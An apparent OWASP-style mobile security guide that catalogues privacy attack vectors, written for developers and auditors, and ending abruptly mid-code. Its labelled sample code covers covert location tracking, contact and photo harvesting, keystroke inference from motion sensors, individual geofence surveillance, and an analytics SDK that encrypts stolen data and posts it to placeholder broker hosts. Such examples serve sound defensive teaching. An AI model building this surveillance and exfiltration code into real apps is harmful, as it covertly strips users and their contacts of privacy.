# M06: Inadequate Privacy Controls - Attack Vectors

## Table of Contents
1. [Introduction](#introduction)
2. [Attack Methodology Overview](#attack-methodology-overview)
3. [Permission Abuse Attacks](#permission-abuse-attacks)
4. [Background Data Collection](#background-data-collection)
5. [Location Tracking Exploitation](#location-tracking-exploitation)
6. [PII Extraction Methods](#pii-extraction-methods)
7. [Contact and Photo Access Abuse](#contact-and-photo-access-abuse)
8. [Third-Party SDK Exploitation](#third-party-sdk-exploitation)
9. [Sensor Data Harvesting](#sensor-data-harvesting)
10. [Clipboard and Pasteboard Attacks](#clipboard-and-pasteboard-attacks)
11. [Detection and Forensics](#detection-and-forensics)
12. [Real-World Attack Examples](#real-world-attack-examples)

---

## Introduction

Unlike traditional attack vectors where external adversaries exploit vulnerabilities, inadequate privacy controls create a scenario where **the application itself becomes the threat actor**. These attacks don't require exploiting bugs or bypassing security measures—they abuse legitimate functionality to violate user privacy.

This document outlines how malicious or negligent developers leverage insufficient privacy controls to:
- Collect excessive user data beyond app functionality
- Track users continuously without their knowledge
- Extract personally identifiable information (PII)
- Monetize user data through third-party sharing
- Build comprehensive surveillance profiles

Understanding these attack vectors is crucial for:
- **Developers**: Recognizing privacy anti-patterns
- **Security Auditors**: Identifying privacy violations
- **Users**: Understanding privacy risks in mobile apps
- **Regulators**: Enforcing privacy compliance

---

## Attack Methodology Overview

### The Privacy Attack Lifecycle

```
Phase 1: Permission Acquisition
├─ Request excessive permissions
├─ Use dark patterns to coerce consent
├─ Bundle permissions to hide individual requests
└─ Exploit permission confusion

Phase 2: Data Collection
├─ Collect more data than disclosed
├─ Background harvesting
├─ Sensor data aggregation
└─ Third-party SDK instrumentation

Phase 3: Data Aggregation
├─ Cross-reference multiple data sources
├─ Build user profiles
├─ De-anonymize "anonymous" data
└─ Link across devices/accounts

Phase 4: Data Exploitation
├─ Behavioral profiling
├─ Targeted manipulation
├─ Data broker sales
├─ Surveillance and tracking
└─ Competitive intelligence

Phase 5: Concealment
├─ Obfuscated data transmission
├─ Encryption to hide payloads
├─ Delayed transmission
└─ Attribution laundering
```

### Attacker Profiles

**1. Malicious App Developer**
```yaml
Goal: Monetize user data
Methods:
  - Excessive data collection
  - Third-party data sales
  - Advertising profile building
Sophistication: Medium
Detection: Privacy analysis, network monitoring
```

**2. Advertising/Analytics SDK**
```yaml
Goal: Cross-app user profiling
Methods:
  - Device fingerprinting
  - Persistent identifiers
  - Behavioral tracking
Sophistication: High
Detection: Difficult (legitimate functionality)
```

**3. State Surveillance**
```yaml
Goal: Mass surveillance
Methods:
  - Mandatory backdoors in apps
  - Compelled data sharing
  - Location tracking infrastructure
Sophistication: Very High
Detection: Very Difficult (legal compliance)
```

**4. Data Broker**
```yaml
Goal: Aggregate and sell user data
Methods:
  - SDK integration
  - Data purchase agreements
  - Cross-source correlation
Sophistication: High
Detection: Requires supply chain analysis
```

---

## Permission Abuse Attacks

### Attack 1: Permission Bundling

**Technique**: Request multiple permissions simultaneously to overwhelm users.

```kotlin
// ATTACK: Bundle all permissions at once
val permissions = arrayOf(
    Manifest.permission.CAMERA,
    Manifest.permission.RECORD_AUDIO,
    Manifest.permission.ACCESS_FINE_LOCATION,
    Manifest.permission.ACCESS_BACKGROUND_LOCATION,
    Manifest.permission.READ_CONTACTS,
    Manifest.permission.READ_PHONE_STATE,
    Manifest.permission.READ_SMS,
    Manifest.permission.WRITE_EXTERNAL_STORAGE,
    Manifest.permission.READ_CALENDAR,
    Manifest.permission.BODY_SENSORS
)

// Request all at app startup
ActivityCompat.requestPermissions(this, permissions, REQUEST_CODE)
```

**Impact**:
- Users grant without reading each permission
- No context for why each permission is needed
- Accept rate increases when bundled (dark pattern)

**Detection**:
```bash
# Android: Check manifest for excessive permissions
adb shell dumpsys package <package.name> | grep permission
```

---

### Attack 2: Deceptive Permission Justification

**Technique**: Misleading explanations for permission requests.

```swift
// ATTACK: Misleading purpose string
<key>NSLocationAlwaysAndWhenInUseUsageDescription</key>
<string>We use your location to enhance your experience</string>
<!-- Vague, doesn't explain actual tracking use -->

<key>NSContactsUsageDescription</key>
<string>Connect with friends</string>
<!-- Doesn't mention uploading entire contact list -->
```

**Actual Behavior**:
```swift
// What the app actually does
func collectAllContacts() {
    let store = CNContactStore()
    let keys = [CNContactGivenNameKey, CNContactPhoneNumbersKey, 
                CNContactEmailAddressesKey] as [CNKeyDescriptor]
    
    let request = CNContactFetchRequest(keysToFetch: keys)
    try? store.enumerateContacts(with: request) { contact, _ in
        // Upload ALL contacts to server
        uploadToServer(contact)
    }
}
```

---

### Attack 3: Permission Escalation

**Technique**: Start with minimal permissions, gradually request more.

```kotlin
// ATTACK: Gradual permission escalation
// Week 1: Location "When in Use"
requestPermission(ACCESS_COARSE_LOCATION)

// Week 2: Upgrade to Fine Location
requestPermission(ACCESS_FINE_LOCATION)

// Week 3: Request Background Location (now users trust the app)
requestPermission(ACCESS_BACKGROUND_LOCATION)

// Week 4: Add sensors and contacts
requestPermission(BODY_SENSORS)
requestPermission(READ_CONTACTS)
```

**Why It Works**:
- Users already invested in the app
- Prior permissions create trust
- Incremental requests seem reasonable

---

### Attack 4: Forced Consent

**Technique**: App refuses to function without unnecessary permissions.

```java
// ATTACK: Gate core functionality behind unrelated permissions
@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    
    if (!hasContactsPermission()) {
        // Block entire app for unrelated permission
        showPermissionRequiredScreen();
        return; // User can't use app without granting
    }
    
    // App for reading news - doesn't need contacts!
    loadNewsContent();
}
```

**GDPR Violation**: Consent must be "freely given" - this is coercion.

---

## Background Data Collection

### Attack 5: Silent Location Tracking

**Technique**: Continuous location tracking without user awareness.

```kotlin
// ATTACK: Aggressive background location tracking
class LocationTrackingService : Service() {
    
    private val locationRequest = LocationRequest.create().apply {
        interval = 60000        // Every 1 minute
        fastestInterval = 30000 // As often as 30 seconds
        priority = LocationRequest.PRIORITY_HIGH_ACCURACY
        maxWaitTime = 120000
    }
    
    override fun onCreate() {
        super.onCreate()
        
        // Start foreground service to avoid restrictions
        startForeground(NOTIFICATION_ID, buildNotification())
        
        // Continuous tracking
        fusedLocationClient.requestLocationUpdates(
            locationRequest,
            locationCallback,
            Looper.getMainLooper()
        )
    }
    
    private val locationCallback = object : LocationCallback() {
        override fun onLocationResult(result: LocationResult) {
            result.locations.forEach { location ->
                // Send to server immediately
                sendLocationToServer(
                    latitude = location.latitude,
                    longitude = location.longitude,
                    accuracy = location.accuracy,
                    timestamp = location.time,
                    speed = location.speed,
                    bearing = location.bearing
                )
            }
        }
    }
}
```

**Attack Enhancements**:
```kotlin
// Persist across reboots
class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Intent.ACTION_BOOT_COMPLETED) {
            // Restart tracking service
            context.startService(Intent(context, LocationTrackingService::class.java))
        }
    }
}
```

**Data Exfiltration**:
```json
// Payload sent every minute
{
    "device_id": "persistent_identifier",
    "timestamp": "2024-01-15T14:32:15Z",
    "latitude": 37.7749,
    "longitude": -122.4194,
    "accuracy": 5.0,
    "speed": 12.5,
    "bearing": 180.0,
    "app_state": "background",
    "battery_level": 67,
    "network_type": "wifi"
}
```

**Privacy Impact**:
- Complete movement history
- Home/work locations revealed
- Medical appointments, places of worship, political events
- Patterns reveal identity even without name

---

### Attack 6: Background Sensor Monitoring

**Technique**: Harvest accelerometer, gyroscope data in background.

```swift
// ATTACK: Background motion data collection
class MotionDataCollector {
    let motionManager = CMMotionManager()
    var activityManager = CMMotionActivityManager()
    
    func startBackgroundCollection() {
        // Accelerometer data (no permission required!)
        motionManager.accelerometerUpdateInterval = 0.1 // 10 Hz
        motionManager.startAccelerometerUpdates(to: .main) { data, error in
            if let data = data {
                self.processMotionData(data)
            }
        }
        
        // Activity recognition
        activityManager.startActivityUpdates(to: .main) { activity in
            // Infer: walking, running, driving, stationary
            self.inferActivity(activity)
        }
        
        // Pedometer (step count)
        let pedometer = CMPedometer()
        pedometer.startUpdates(from: Date()) { data, error in
            // Track daily movement patterns
            self.trackStepCount(data)
        }
    }
    
    func processMotionData(_ data: CMAccelerometerData) {
        let payload = [
            "timestamp": Date().timeIntervalSince1970,
            "x": data.acceleration.x,
            "y": data.acceleration.y,
            "z": data.acceleration.z
        ]
        // Send to analytics server
        sendToServer(payload)
    }
}
```

**What Can Be Inferred**:
```yaml
From Motion Data:
  - Activity: Walking, running, cycling, driving
  - Location context: Gym, office (sitting), commute
  - Health patterns: Exercise frequency, gait analysis
  - Behavioral routine: Wake/sleep times, activity patterns
  - Age/fitness estimation: Movement speed, intensity
  
Advanced Analysis:
  - Keystroke patterns (unique identifier)
  - Tremor detection (health conditions)
  - Stress levels (movement intensity)
```

---

### Attack 7: WiFi and Bluetooth Scanning

**Technique**: Create location fingerprint from nearby networks.

```java
// ATTACK: WiFi geolocation without GPS permission
// Android 10+ requires location permission, but many apps still do this
WifiManager wifiManager = (WifiManager) getSystemService(Context.WIFI_SERVICE);
List<ScanResult> scanResults = wifiManager.getScanResults();

JSONArray wifiFingerprint = new JSONArray();
for (ScanResult result : scanResults) {
    JSONObject network = new JSONObject();
    network.put("bssid", result.BSSID);     // MAC address
    network.put("ssid", result.SSID);       // Network name
    network.put("level", result.level);     // Signal strength
    network.put("frequency", result.frequency);
    wifiFingerprint.put(network);
}

// Send to geolocation database
// Reveals location without GPS permission
sendToGeolocationService(wifiFingerprint);
```

**Bluetooth Beacon Scanning**:
```swift
// ATTACK: Indoor location tracking via Bluetooth beacons
import CoreBluetooth

class BeaconScanner: NSObject, CBCentralManagerDelegate {
    var centralManager: CBCentralManager!
    
    func startScanning() {
        centralManager = CBCentralManager(delegate: self, queue: nil)
    }
    
    func centralManager(_ central: CBCentralManager, 
                       didDiscover peripheral: CBPeripheral,
                       advertisementData: [String : Any], 
                       rssi RSSI: NSNumber) {
        // Collect all Bluetooth devices
        let beacon = [
            "uuid": peripheral.identifier.uuidString,
            "name": peripheral.name ?? "Unknown",
            "rssi": RSSI,
            "timestamp": Date().timeIntervalSince1970
        ]
        
        // Send for indoor positioning
        sendBeaconData(beacon)
    }
}
```

**Geolocation Database Attack**:
```
Step 1: Collect WiFi BSSIDs + GPS coordinates (crowdsourced)
Step 2: Build database: BSSID → Location
Step 3: Any app can query: BSSIDs → Get approximate location
Result: Location tracking without location permission
```

---

## Location Tracking Exploitation

### Attack 8: Location History Aggregation

**Technique**: Store and analyze complete location history.

```python
# ATTACK: Server-side location history analysis
# Backend receiving location data from mobile app

class LocationAnalytics:
    def analyze_user_patterns(self, user_id):
        locations = db.query("""
            SELECT latitude, longitude, timestamp, accuracy
            FROM location_tracking
            WHERE user_id = ?
            ORDER BY timestamp
        """, user_id)
        
        # Infer sensitive locations
        home = self.infer_home_location(locations)
        work = self.infer_work_location(locations)
        
        # Identify places of interest
        visited_places = self.cluster_frequent_locations(locations)
        
        # Reverse geocode to identify sensitive locations
        sensitive_locations = []
        for place in visited_places:
            poi = self.reverse_geocode(place.lat, place.lng)
            if poi.category in ['medical', 'religious', 'political']:
                sensitive_locations.append(poi)
        
        # Build behavior profile
        profile = {
            'user_id': user_id,
            'home_address': home,
            'work_address': work,
            'commute_pattern': self.analyze_commute(locations),
            'frequently_visited': visited_places,
            'sensitive_places': sensitive_locations,
            'travel_history': self.extract_trips(locations),
            'socioeconomic_indicators': self.infer_wealth(visited_places)
        }
        
        # Monetize: Sell to data brokers
        self.send_to_data_broker(profile)
        
        return profile
```

**Location Inference Algorithms**:
```python
def infer_home_location(self, locations):
    """Identify home: most common location during 10PM-6AM"""
    night_locations = [
        loc for loc in locations 
        if 22 <= loc.timestamp.hour or loc.timestamp.hour <= 6
    ]
    
    # Cluster and find most frequent
    clusters = DBSCAN(eps=0.0001, min_samples=5).fit(night_locations)
    home_cluster = most_common_cluster(clusters)
    
    # Reverse geocode to street address
    return reverse_geocode(home_cluster.centroid)

def infer_socioeconomic_status(self, places):
    """Infer wealth from visited locations"""
    indicators = {
        'expensive_restaurants': 0,
        'luxury_stores': 0,
        'private_clubs': 0,
        'wealthy_neighborhoods': 0
    }
    
    for place in places:
        if place.price_range == 'expensive':
            indicators['expensive_restaurants'] += 1
        if place.type in ['luxury_retail', 'private_club']:
            indicators['luxury_stores'] += 1
        if place.neighborhood_median_income > 150000:
            indicators['wealthy_neighborhoods'] += 1
    
    return calculate_ses_score(indicators)
```

---

### Attack 9: Location-Based Surveillance

**Technique**: Target tracking of specific individuals.

```javascript
// ATTACK: Geofence monitoring for surveillance
// Backend creates geofences around targets

class SurveillanceSystem {
    createGeofence(targetLocation, radius, userId) {
        const geofence = {
            id: generateId(),
            latitude: targetLocation.lat,
            longitude: targetLocation.lng,
            radius: radius, // meters
            monitored_users: [userId],
            created_at: Date.now()
        };
        
        // Store geofence
        this.geofences.push(geofence);
        
        // Monitor for entries/exits
        this.startMonitoring(geofence);
    }
    
    checkLocationAgainstGeofences(userId, location) {
        const userGeofences = this.geofences.filter(g => 
            g.monitored_users.includes(userId)
        );
        
        for (const geofence of userGeofences) {
            const distance = this.calculateDistance(
                location.lat, location.lng,
                geofence.latitude, geofence.longitude
            );
            
            if (distance <= geofence.radius) {
                // Target entered monitored area
                this.triggerAlert({
                    type: 'GEOFENCE_ENTRY',
                    user_id: userId,
                    geofence_id: geofence.id,
                    timestamp: Date.now(),
                    location: location
                });
                
                // Increase tracking frequency
                this.requestHighFrequencyUpdates(userId);
            }
        }
    }
    
    // Create geofences around sensitive locations
    surveilleUser(userId) {
        const userLocations = this.getLocationHistory(userId);
        
        // Identify and monitor their routine locations
        const home = this.inferHome(userLocations);
        const work = this.inferWork(userLocations);
        
        this.createGeofence(home, 100, userId);
        this.createGeofence(work, 100, userId);
        
        // Monitor visits to specific categories
        const placesOfInterest = [
            'medical_facilities',
            'places_of_worship',
            'political_venues',
            'legal_offices',
            'competing_businesses'
        ];
        
        for (const category of placesOfInterest) {
            const locations = this.findNearbyPlaces(home, category);
            locations.forEach(loc => 
                this.createGeofence(loc, 50, userId)
            );
        }
    }
}
```

**Use Cases (Malicious)**:
- Stalking and harassment
- Competitive intelligence (track competitor employees)
- Political surveillance
- Divorce/custody cases (unauthorized tracking)
- Insurance fraud detection (without consent)

---

## PII Extraction Methods

### Attack 10: Log File PII Leakage

**Technique**: Logging sensitive user information.

```java
// ATTACK: Excessive logging with PII
public class UserAuthService {
    private static final Logger log = Logger.getLogger(UserAuthService.class);
    
    public User authenticate(String email, String password) {
        // PII LEAKAGE: Email and password in logs
        log.info("Authentication attempt for email: " + email);
        log.debug("Password: " + password); // CRITICAL LEAK
        
        User user = userRepository.findByEmail(email);
        
        if (user != null) {
            // PII LEAKAGE: Entire user object
            log.info("User found: " + user.toString());
            // toString() contains: name, email, address, phone, SSN, etc.
            
            if (passwordHasher.verify(password, user.getPasswordHash())) {
                String token = generateToken(user);
                
                // PII LEAKAGE: Session token
                log.info("Generated token for user " + user.getId() + ": " + token);
                
                return user;
            } else {
                // PII LEAKAGE: Failed attempts reveal valid emails
                log.warn("Invalid password for user: " + email);
            }
        }
        
        return null;
    }
    
    public void updateProfile(User user, ProfileData data) {
        // PII LEAKAGE: Complete profile in logs
        log.info("Updating profile for " + user.getEmail() + 
                 " with data: " + data.toJson());
        // data.toJson() contains: DOB, SSN, address, phone, etc.
        
        user.setName(data.getName());
        user.setAddress(data.getAddress());
        user.setPhone(data.getPhone());
        user.setSsn(data.getSsn());
        
        userRepository.save(user);
        
        // PII LEAKAGE: Confirmation with full details
        log.info("Profile updated successfully: " + user.toString());
    }
}
```

**Where Logs Go**:
```yaml
Log Destinations (Privacy Risks):
  - Local Device Storage: Accessible to other apps, backups
  - Cloud Logging Services: Splunk, Datadog, CloudWatch (third parties)
  - Crash Reporting: Crashlytics, Sentry (stack traces with PII)
  - Analytics Platforms: Mixpanel, Amplitude (event properties)
  - Developer Consoles: Visible to all team members
  - Log Aggregation: Centralized, often unencrypted
```

---

### Attack 11: Analytics PII Exposure

**Technique**: Send PII to analytics platforms.

```javascript
// ATTACK: Sending PII to analytics
class AnalyticsTracker {
    trackUserAction(user, action) {
        // PII LEAKAGE: User details in analytics
        analytics.track(action, {
            // Identifying information
            user_id: user.id,
            email: user.email,              // PII
            name: user.fullName,            // PII
            phone: user.phoneNumber,        // PII
            address: user.address,          // PII
            
            // Demographic PII
            date_of_birth: user.dob,        // PII
            gender: user.gender,
            ethnicity: user.ethnicity,
            
            // Financial PII
            income_range: user.income,
            credit_score: user.creditScore,
            
            // Health PII
            health_conditions: user.healthData,
            prescriptions: user.medications,
            
            // Behavioral data
            browsing_history: user.recentViews,
            purchase_history: user.orders,
            
            // Device identifiers
            device_id: device.uniqueId,
            advertising_id: device.advertisingId,
            ip_address: device.ipAddress
        });
    }
    
    trackScreenView(screenName, user) {
        // PII in screen names
        analytics.screen(`${screenName}_${user.email}`);
        // Example: "checkout_john.doe@email.com"
    }
    
    trackError(error, user) {
        // PII in error messages
        analytics.trackError({
            message: error.message,
            stack: error.stack,  // May contain PII in variables
            user_email: user.email,
            user_context: user.toJSON() // Complete user object
        });
    }
}
```

**Third-Party Visibility**:
```
Analytics Event Flow:

App → Analytics SDK → Third-Party Servers
                    ↓
              Data Processing
                    ↓
         ┌──────────┴──────────┐
         ↓                     ↓
   Analytics Platform    Data Brokers
         ↓                     ↓
   Dashboard Access      Resold to:
   (All employees)       - Advertisers
                         - Insurance
                         - Employers
                         - Gov agencies
```

---

### Attack 12: Crash Report PII Leakage

**Technique**: PII in crash reports and stack traces.

```kotlin
// ATTACK: PII in crash reporting
class PaymentProcessor {
    fun processPayment(cardNumber: String, cvv: String, user: User) {
        try {
            // Process payment
            val result = paymentGateway.charge(
                cardNumber = cardNumber,  // Sensitive!
                cvv = cvv,                // Sensitive!
                amount = cart.total,
                email = user.email        // PII
            )
            
            logger.debug("Payment result: $result") // Contains card details!
            
        } catch (e: Exception) {
            // ATTACK: Crash report contains PII
            Crashlytics.log("Payment failed for ${user.email}")
            Crashlytics.setCustomKey("card_number", cardNumber) // PII LEAK!
            Crashlytics.setCustomKey("cvv", cvv) // PII LEAK!
            Crashlytics.setCustomKey("user_data", user.toString()) // PII LEAK!
            
            // Stack trace may contain variable values
            Crashlytics.recordException(e)
            
            // Example stack trace:
            // PaymentProcessor.processPayment(cardNumber="4532123412341234", 
            //                                 cvv="123", 
            //                                 user=User(email="victim@email.com"))
        }
    }
}
```

---

## Contact and Photo Access Abuse

### Attack 13: Contact List Harvesting

**Technique**: Upload entire contact list to server.

```swift
// ATTACK: Contact harvesting
import Contacts

class ContactHarvester {
    func harvestAllContacts() {
        let store = CNContactStore()
        
        // Request access
        store.requestAccess(for: .contacts) { granted, error in
            if granted {
                self.uploadAllContacts(store)
            }
        }
    }
    
    func uploadAllContacts(_ store: CNContactStore) {
        let keys = [
            CNContactGivenNameKey,
            CNContactFamilyNameKey,
            CNContactPhoneNumbersKey,
            CNContactEmailAddressesKey,
            CNContactPostalAddressesKey,
            CNContactBirthdayKey,
            CNContactOrganizationNameKey,
            CNContactJobTitleKey,
            CNContactSocialProfilesKey,
            CNContactUrlAddressesKey,
            CNContactNoteKey
        ] as [CNKeyDescriptor]
        
        let fetchRequest = CNContactFetchRequest(keysToFetch: keys)
        
        var allContacts: [[String: Any]] = []
        
        try? store.enumerateContacts(with: fetchRequest) { contact, _ in
            let contactData: [String: Any] = [
                "first_name": contact.givenName,
                "last_name": contact.familyName,
                "phone_numbers": contact.phoneNumbers.map { $0.value.stringValue },
                "emails": contact.emailAddresses.map { $0.value as String },
                "addresses": contact.postalAddresses.map { self.formatAddress($0.value) },
                "birthday": contact.birthday?.date?.description ?? "",
                "company": contact.organizationName,
                "job_title": contact.jobTitle,
                "social_profiles": contact.socialProfiles.map { 
                    ["service": $0.value.service, "username": $0.value.username] 
                },
                "websites": contact.urlAddresses.map { $0.value as String },
                "notes": contact.note
            ]
            
            allContacts.append(contactData)
        }
        
        // Upload everything to server
        uploadToServer(allContacts)
    }
    
    func uploadToServer(_ contacts: [[String: Any]]) {
        let payload = [
            "device_id": UIDevice.current.identifierForVendor?.uuidString ?? "",
            "user_id": currentUserId,
            "contacts": contacts,
            "timestamp": Date().timeIntervalSince1970,
            "contact_count": contacts.count
        ]
        
        // Send to social graph building service
        API.post("/api/contacts/upload", json: payload)
        
        // Also send to third-party data enrichment service
        DataBroker.enrichContactData(contacts)
    }
}
```

**Privacy Violations**:
```yaml
Issues:
  - Non-users exposed: People who never agreed to terms
  - Relationship graph: Who knows whom
  - Personal information: Leaked without consent
  - Permanent storage: Can't be deleted by contact owners
  - Cross-referencing: Build shadow profiles
  - Third-party sharing: Contacts sold to data brokers

Example Impact:
  User A has 500 contacts
  × Each contact has 500 contacts
  × 6 degrees of separation
  = Potential to map millions of people who never used the app
```

---

### Attack 14: Photo Metadata Extraction

**Technique**: Extract location and metadata from photos.

```java
// ATTACK: Photo EXIF data extraction
public class PhotoAnalyzer {
    public void analyzeUserPhotos() {
        // Get all photos from user's library
        Cursor cursor = getContentResolver().query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            new String[]{MediaStore.Images.Media.DATA},
            null, null, null
        );
        
        List<PhotoMetadata> photoData = new ArrayList<>();
        
        while (cursor.moveToNext()) {
            String imagePath = cursor.getString(0);
            PhotoMetadata metadata = extractEXIF(imagePath);
            photoData.add(metadata);
        }
        
        // Analyze and upload
        analyzeAndUpload(photoData);
    }
    
    private PhotoMetadata extractEXIF(String imagePath) {
        try {
            ExifInterface exif = new ExifInterface(imagePath);
            
            PhotoMetadata metadata = new PhotoMetadata();
            
            // Location data
            float[] latLong = new float[2];
            if (exif.getLatLong(latLong)) {
                metadata.latitude = latLong[0];
                metadata.longitude = latLong[1];
            }
            
            // Device information
            metadata.cameraMake = exif.getAttribute(ExifInterface.TAG_MAKE);
            metadata.cameraModel = exif.getAttribute(ExifInterface.TAG_MODEL);
            metadata.software = exif.getAttribute(ExifInterface.TAG_SOFTWARE);
            
            // Timestamp
            metadata.dateTaken = exif.getAttribute(ExifInterface.TAG_DATETIME);
            
            // Technical details (can fingerprint device)
            metadata.focalLength = exif.getAttribute(ExifInterface.TAG_FOCAL_LENGTH);
            metadata.iso = exif.getAttribute(ExifInterface.TAG_ISO_SPEED_RATINGS);
            metadata.imageWidth = exif.getAttributeInt(ExifInterface.TAG_IMAGE_WIDTH, 0);
            metadata.imageHeight = exif.getAttributeInt(ExifInterface.TAG_IMAGE_LENGTH, 0);
            
            // Face detection (if available)
            metadata.faceCount = detectFaces(imagePath);
            
            return metadata;
            
        } catch (IOException e) {
            return null;
        }
    }
    
    private void analyzeAndUpload(List<PhotoMetadata> photoData) {
        // Build location history from photos
        List<Location> photoLocations = new ArrayList<>();
        for (PhotoMetadata photo : photoData) {
            if (photo.latitude != 0 && photo.longitude != 0) {
                photoLocations.add(new Location(
                    photo.latitude, 
                    photo.longitude, 
                    photo.dateTaken
                ));
            }
        }
        
        // Infer patterns
        Map<String, Object> analysis = new HashMap<>();
        analysis.put("home_location", inferHomeFromPhotos(photoLocations));
        analysis.put("travel_history", extractTravelHistory(photoLocations));
        analysis.put("frequent_locations", clusterLocations(photoLocations));
        analysis.put("device_fingerprint", createDeviceFingerprint(photoData));
        analysis.put("photo_count", photoData.size());
        analysis.put("people_identified", countUniqueFaces(photoData));
        
        // Upload to server
        uploadAnalysis(analysis);
    }
}
```

**What Can Be Extracted**:
```yaml
From Photo EXIF Data:
  Location:
    - GPS coordinates (precise to meters)
    - Location history (from photo timestamps)
    - Home/travel locations
    - Vacation patterns
  
  Device Information:
    - Camera make/model
    - Software version
    - Device fingerprinting
    - Ownership timeline
  
  Temporal Patterns:
    - Sleep schedule (no photos during sleep)
    - Activity patterns
    - Event attendance
  
  Social Information:
    - Face recognition (who you're with)
    - Social network mapping
    - Relationship analysis
  
  Lifestyle:
    - Travel frequency
    - Socioeconomic status (from locations)
    - Hobbies and interests
```

---

## Third-Party SDK Exploitation

### Attack 15: SDK Data Exfiltration

**Technique**: Third-party SDKs silently collect and transmit data.

```kotlin
// ATTACK: Malicious analytics SDK
// What the SDK documentation says:
// "Simple analytics to track app usage"

// What it actually does:
class AnalyticsSDK private constructor() {
    
    companion object {
        fun initialize(context: Context, apiKey: String) {
            // Start background data collection
            startDataHarvesting(context)
        }
    }
    
    private fun startDataHarvesting(context: Context) {
        // Collect device information
        val deviceData = collectDeviceInfo(context)
        
        // Collect installed apps
        val installedApps = collectInstalledApps(context)
        
        // Collect location (if permission granted to host app)
        val location = collectLocation(context)
        
        // Collect contacts (if permission granted to host app)
        val contacts = collectContacts(context)
        
        // Collect WiFi networks
        val wifiNetworks = collectWifiNetworks(context)
        
        // Collect clipboard
        val clipboard = collectClipboard(context)
        
        // Generate persistent identifier
        val persistentId = generatePersistentId(context)
        
        // Collect advertising ID
        val advertisingId = getAdvertisingId(context)
        
        // Bundle everything
        val payload = bundleData(
            deviceData, installedApps, location, contacts,
            wifiNetworks, clipboard, persistentId, advertisingId
        )
        
        // Obfuscate and encrypt to hide from network analysis
        val encrypted = encryptPayload(payload)
        
        // Send to multiple endpoints for redundancy
        sendToServer(encrypted, "https://analytics.example.com/collect")
        sendToServer(encrypted, "https://backup.example.net/data")
        
        // Send to data broker partners
        sendToDataBrokers(payload)
        
        // Schedule periodic collection
        schedulePeriodicHarvesting(context)
    }
    
    private fun collectInstalledApps(context: Context): List<String> {
        val packageManager = context.packageManager
        val apps = packageManager.getInstalledApplications(PackageManager.GET_META_DATA)
        
        return apps.map { it.packageName }
        // Reveals: Banking apps, health apps, dating apps, VPN usage, etc.
    }
    
    private fun generatePersistentId(context: Context): String {
        // Create identifier that persists across app uninstalls
        val androidId = Settings.Secure.getString(
            context.contentResolver, 
            Settings.Secure.ANDROID_ID
        )
        
        val buildInfo = Build.MANUFACTURER + Build.MODEL + Build.SERIAL
        
        // Hash to create unique, persistent identifier
        return hashString(androidId + buildInfo)
    }
    
    private fun sendToDataBrokers(data: Map<String, Any>) {
        // Sell user data to multiple data brokers
        val brokers = listOf(
            "https://databroker1.com/buy",
            "https://databroker2.com/ingest",
            "https://advertiser-data.com/users"
        )
        
        brokers.forEach { endpoint ->
            HTTP.post(endpoint, data)
        }
    }
}
```

**Host App Integration** (Appears Innocent):
```kotlin
// App developer thinks they're just adding analytics
class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Innocent-looking SDK initialization
        AnalyticsSDK.initialize(this, "api_key_123")
        
        // Developer is unaware of data harvesting happening in background
    }
}
```

**Network Traffic** (Obfuscated):
```json
// Actual payload (encrypted and obfuscated in transit):
{
    "uid": "a3f9c8e1d4b2c5a9", // Persistent ID
    "aid": "e7d9c4a2-b8f3-4e1c-9a7d-3c5e8f2a1b9d", // Advertising ID
    "dev": {
        "make": "Samsung",
        "model": "SM-G991U",
        "os": "Android 13",
        "carrier": "Verizon",
        "ip": "192.168.1.100"
    },
    "loc": {"lat": 37.7749, "lng": -122.4194},
    "apps": [
        "com.chase.bank",
        "com.tinder",
        "com.nordvpn",
        "com.myfitnesspal"
    ],
    "contacts": 342,
    "wifi": ["HomeNetwork", "OfficeWiFi"],
    "clip": "password123" // Clipboard content
}
```

---

## Sensor Data Harvesting

### Attack 16: Keystroke Inference from Motion

**Technique**: Use accelerometer data to infer typed passwords.

```python
# ATTACK: Server-side keystroke inference from motion data
import numpy as np
from sklearn.ensemble import RandomForestClassifier

class KeystrokeInferenceAttack:
    """
    Infer typed keys from accelerometer data
    Research: "Tapprints" attack - 70%+ accuracy
    """
    
    def __init__(self):
        self.model = self.train_keystroke_model()
    
    def analyze_motion_data(self, accelerometer_data, gyroscope_data):
        """
        Accelerometer data reveals phone movements during typing
        Different keys cause different vibration patterns
        """
        
        # Segment data into individual keypress windows
        keypresses = self.segment_keypresses(accelerometer_data)
        
        # Extract features for each keypress
        features = []
        for keypress in keypresses:
            feature_vector = self.extract_features(keypress)
            features.append(feature_vector)
        
        # Infer keys using trained model
        predicted_keys = self.model.predict(features)
        
        # Reconstruct typed text
        reconstructed_text = ''.join(predicted_keys)
        
        return reconstructed_text
    
    def extract_features(self, motion_window):
        """Extract identifying features from motion data"""
        return {
            'mean_x': np.mean(motion_window['x']),
            'mean_y': np.mean(motion_window['y']),
            'mean_z': np.mean(motion_window['z']),
            'std_x': np.std(motion_window['x']),
            'std_y': np.std(motion_window['y']),
            'std_z': np.std(motion_window['z']),
            'peak_magnitude': np.max(motion_window['magnitude']),
            'frequency_components': self.fft_features(motion_window)
        }
    
    def infer_password(self, user_id, typing_session):
        """
        Infer password from typing patterns during login
        """
        motion_data = self.get_motion_data(user_id, typing_session)
        
        # Keystroke inference
        inferred_keys = self.analyze_motion_data(
            motion_data['accelerometer'],
            motion_data['gyroscope']
        )
        
        # Identify password input (typically 8-20 chars, followed by enter)
        potential_passwords = self.identify_password_patterns(inferred_keys)
        
        return potential_passwords

# Example attack scenario
def attack_scenario():
    """
    1. User grants app permission to sensors (no permission required!)
    2. App collects motion data in background
    3. User types password in banking app
    4. Malicious app records accelerometer during typing
    5. Server-side ML model infers password
    6. Attacker has user's banking password
    """
    pass
```

---

### Attack 17: Health Data Inference

**Technique**: Infer health conditions from motion patterns.

```swift
// ATTACK: Health inference from motion sensors
import CoreMotion

class HealthInferenceEngine {
    let motionManager = CMMotionManager()
    let pedometer = CMPedometer()
    
    func startHealthProfiling() {
        // Collect motion data
        collectGaitPattern()
        collectActivityLevels()
        collectSleepPatterns()
    }
    
    func collectGaitPattern() {
        // Analyze walking pattern
        motionManager.startDeviceMotionUpdates(to: .main) { motion, error in
            guard let motion = motion else { return }
            
            let gaitFeatures = self.analyzeGait(
